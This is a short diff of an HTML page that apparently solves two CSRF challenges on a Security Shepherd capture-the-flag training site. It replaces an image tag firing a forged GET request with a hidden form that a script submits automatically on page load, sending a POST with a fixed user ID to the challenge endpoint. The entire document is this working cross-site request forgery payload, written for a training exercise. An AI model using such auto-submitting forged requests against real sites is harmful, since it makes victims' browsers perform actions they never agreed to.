@@ -5,8 +5,14 @@
 </head>
 
 <body>
-<img src="https://security-shepherd.ctf365.com/user/csrfchallengeone/plusplus?userid=3da599cffe30985c270bdc9a48a5a25630065917"/>
-Thank you very much.
+<form name="csrfForm" action="/user/csrfchallengetwo/plusplus" method="POST">
+<input type="hidden" name="userId" value="3da599cffe30985c270bdc9a48a5a25630065917" />
+<input type="submit"/>
+</form>
+<script>
+document.csrfForm.submit();
+</script> 
+Thank you very much. Again.
 </body>
 
 </html>
